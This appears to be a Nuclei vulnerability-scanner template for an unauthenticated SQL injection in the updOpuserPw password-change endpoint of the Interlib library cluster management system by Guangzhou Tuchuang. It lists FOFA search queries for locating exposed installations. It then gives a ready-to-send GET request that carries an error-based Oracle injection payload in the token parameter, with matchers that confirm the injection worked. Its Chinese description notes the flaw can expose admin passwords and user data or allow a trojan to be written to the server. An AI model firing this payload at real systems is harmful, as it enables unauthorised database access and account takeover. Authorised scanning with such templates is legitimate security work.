id: tuchuang-updOpuserPw-sql

info:
  name: 广州图创 图书馆集群管理系统 updOpuserPw SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="interlib/common/" || body="Interlib图书馆集群管理系统" || body="/interlib3/system_index" || body="打开Interlib主界面"
    广州图创 图书馆集群管理系统 updOpuserPw 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/4kpHfyQC3uj8_N8LkQudlQ
  tags: sql injection

http:
  - raw:
      - |
        GET /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%209999*9999%20from%20dual))=%272 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '99980001'
      - type: status
        status: 
          - 200